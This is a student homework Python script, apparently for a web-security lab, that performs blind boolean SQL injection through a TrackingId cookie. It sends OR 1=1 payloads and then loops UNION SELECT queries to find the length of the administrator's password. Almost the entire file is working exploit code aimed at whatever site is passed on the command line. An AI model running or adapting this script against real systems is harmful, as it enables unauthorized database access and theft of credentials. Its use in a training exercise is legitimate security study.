# Maksim Semchuk
# CS 495 Homework #2


# Needed Imports:
import requests, sys
from bs4 import BeautifulSoup
import urllib.parse
import time

site = sys.argv[1]
if 'https://' in site:
    site = site.rstrip('/').lstrip('https://')

url = f'https://{site}/'


# Step 4: Inital Program:
def try_query(query):
    print(f'Query: {query}')
    mycookies = {'TrackingId': urllib.parse.quote_plus(query) }
    resp = requests.get(url, cookies=mycookies)
    soup = BeautifulSoup(resp.text, 'html.parser')
    if soup.find('div', text='Welcome back!'):
        return True
    else:
        return False

print(try_query("""x' OR 1=1 --"""))
print(try_query("""x" OR 1=1 --"""))

# Step 6: Find the password Length:
begin_time = time.perf_counter()
num = 1
while True:
    query = f"x' UNION SELECT username FROM users WHERE username='administrator' AND length(password)={num}--"
    print(f'Trying length {num}')
    if try_query(query) == False:
        num = num + 1
    else:
        break

print(f"Password length is {num}")
print(f"Time elapsed is {time.perf_counter()-begin_time}")